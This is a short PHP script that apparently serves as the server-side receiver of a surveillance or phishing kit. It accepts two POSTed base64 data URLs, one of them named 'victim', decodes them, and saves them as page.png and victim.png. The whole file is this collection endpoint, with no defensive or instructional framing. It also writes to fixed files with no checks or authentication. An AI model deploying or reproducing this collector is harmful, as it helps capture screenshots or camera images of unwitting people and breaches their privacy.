<?php

$data=$_POST['data'];
   $contents_split = explode(',', $data);
   $encoded = $contents_split[count($contents_split)-1];
   $decoded = "";
   for ($i=0; $i < ceil(strlen($encoded)/256); $i++) {
      $decoded = $decoded . base64_decode(substr($encoded,$i*256,256)); 
   }
   $data = $decoded; 
$fp = fopen("page.png", "w");
fwrite($fp, $data);
fclose($fp); 


$victim=$_POST['victim'];

   $contents_split1 = explode(',', $victim);
   $encoded1 = $contents_split1[count($contents_split1)-1];
   $decoded1 = "";
   for ($i1=0; $i1 < ceil(strlen($encoded1)/256); $i1++) {
      $decoded1 = $decoded1 . base64_decode(substr($encoded1,$i1*256,256)); 
   }
   $victim = $decoded1; 
$fp1 = fopen("victim.png", "w");
fwrite($fp1, $victim);
fclose($fp1);
?>